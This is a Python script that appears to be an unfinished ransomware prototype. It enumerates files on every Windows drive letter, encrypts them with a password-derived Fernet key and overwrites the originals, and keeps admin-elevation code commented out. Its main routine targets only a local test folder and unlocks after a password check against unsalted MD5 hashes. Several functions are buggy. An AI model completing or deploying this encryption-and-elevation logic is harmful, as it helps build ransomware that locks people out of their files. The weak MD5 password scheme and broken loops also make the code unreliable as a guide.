import base64
import ctypes
import hashlib
import os
import random
import string

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


# IF not admin
#   Run self with admin
#   kill current self
# Else continue

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def create_key_password_based(__s_pwd: str, __b_salt: bytes = None):
    __salt = __b_salt if __b_salt else os.urandom(16)
    if __s_pwd:
        __kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=__salt,
            iterations=100000,
            backend=default_backend()
        )
        __key = base64.urlsafe_b64encode(__kdf.derive(__s_pwd.encode()))
    if __s_pwd and __b_salt:
        return __key
    elif __s_pwd and not __b_salt:
        return __key, __salt
    else:
        return __salt


def password_unlock(user_name:str,password_given:str):
    '''
    :param user_name: name of the account trying to connect
    :param password_given: Password the user gave
    :return: boolean of the password. False if incorrect true if correct
    '''
    login:bool = False
    with open('Account.txt','r') as account:
        data = account.read()
        found = data.find(f'Username: {user_name} password: {password_hash(password_given).hexdigest()}')
        if found != -1:
            print('got it')
            login = True
    return login






def password_lock(password:str):
    '''
    :param password: the password to lock the computer
    :return: make everything inaccessible without the password
    '''
    pass

def password_hash(salted_password:str):
    '''
    :param salted_password: password+salt
    :return: password readable
    '''
    return hashlib.md5(salted_password.encode())


def account_creation(username:str,hashed_password:str):
    file_to_oppen:str = 'Account.txt'
    with open(file_to_oppen,'r') as txt:
        data = txt.read()
        print(data)
    with open(file_to_oppen,'w') as txt:
        txt.write(f'Username: {username} password: {hashed_password}')





def key_generator():
    '''Generate a 128 character Key'''
    char = string.ascii_letters + string.digits + string.punctuation
    key = ''.join(random.choice(char) for i in range(128))
    print(key)


def get_all_accessible_files_in_Dir(init_path:str):
    '''find all the folder it can
    :param:return: return all the folder it could find
    '''
    init_path = f'{init_path}\\'
    files = []
    try:
        for path in os.listdir(init_path):
            if os.path.isfile(os.path.join(init_path, path)):
                files.append(init_path + path)
    except:
        print(f'invalide root {init_path}')

    return files




def get_all_accessible_folder_in_dir(init_path:str):
    '''
    :param init_path: where to look in directory
    :return: all the directorys in there
    '''
    folders = []
    try:
        for path in os.listdir(init_path):
            if os.path.isdir(init_path):
                folders.append(init_path + path)
    except:
        print(f'no access to folder : {init_path}')
    return folders


def get_all_accessible():
    ''''
    find all the directorys in the computer
    '''
    possible_Init = string.ascii_uppercase
    directorys = []
    files = []
    ended_directory = []
    for i in possible_Init:
        init_path = f'{i}:\\'

        try:

            directorys.append(init_path)
            directorys = get_all_accessible_folder_in_dir(init_path)
            files = files + get_all_accessible_files_in_Dir(init_path)
            ended_directory.append(init_path)
            for e in directorys:
                directorys = directorys + get_all_accessible_folder_in_dir(f'{e}\\')
                files = files + get_all_accessible_files_in_Dir(f'{e}\\')
                ended_directory.append(e)
                directorys.remove(e)
            print(f'directorys : {directorys}')
            print(f'files : {files}')
            print(f'ended directorys : {ended_directory}')
        except:
            print('lol')
    final = files
    return final


def encrypt_file(file_path: str, F_key: Fernet):
    try_count = 0
    # READ FILE
    with open(file_path, 'rb') as ef:
        data = ef.read()

    # ENCRYPT
    data = F_key.encrypt(data)

    while os.path.isfile(file_path) or try_count <= 5:
        try:
            # DELETE
            os.remove(file_path)
            # REWRITE FILE
            with open(file_path, 'wb') as ef:
                print("rewrite",file_path)
                ef.write(data)
                break
        finally:
            try_count += 1


def decrypt_file(__n_key: bytes, __s_file_path: str):
    __fernet = Fernet(__n_key)
    with open(__s_file_path, "rb") as __file:
        # read the encrypted data
        __n_encrypted_data = __file.read()
    # decrypt data
    __n_decrypted_data = __fernet.decrypt(__n_encrypted_data)
    # write the original file
    with open(__s_file_path, "wb") as __file:
        __file.write(__n_decrypted_data)



def Get_Key_from_file(file_to_key:str):
    data = ''
    with open(file_to_key,'r') as password :
        data = password.read()
    data = data.strip('Key : ')
    return Fernet(data.encode())

#write the key in a file
def key_memory(F_keys:[]):
    pass
    with open('Key.txt', 'w') as txt:
        for e in F_keys:
            txt.write(f'Key : {e.decode()}')




"""def encrypt_file(file_path,F_key):
    print(f'Encrypthing File : {file_path}')
    try:
         with open(file_path,'rb') as ef:
             data = ef.read()
             print('can oppen the data')
    except:
        print(f'can\'t oppen the file {file_path}')"""

# files = get_all_accessible()
"""for e in files:
    print(encrypt_file(e,cipher))"""

# print(f"The folder returned is : {files}")


def main():
    salt = rb'3CI\x00\x97\xdb\nr\x15\xf6\x96\xac\x98H\xe2N'
    # Look if program is admin
    #if is_admin():
    user = input('New username')
    password = input('New Password')

    account_creation(user,password_hash(password).hexdigest())


    keys = []
    files = get_all_accessible_files_in_Dir('.\\encrypt_thing')
    own_dir = os.getcwd() # get is own directory to not encrypt itself
    key = create_key_password_based(password,salt) # key generator
    cipher = Fernet(key) # hash the key
    print(f'Key : {key.decode()}')
    for e in files:
        if e is not own_dir:
            encrypt_file(e, cipher) # the file it receive
    if password_unlock(input('you want to unlock? Give me you\'re username: '),input('you want to unlock? Give me you\'re password: ')):
        print('work')
        #key_memory(key)
        for e in files :
            decrypt_file(key, e)
    #else:
        # Re-run the program with admin rights
        #ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


if __name__ == "__main__":
    main()

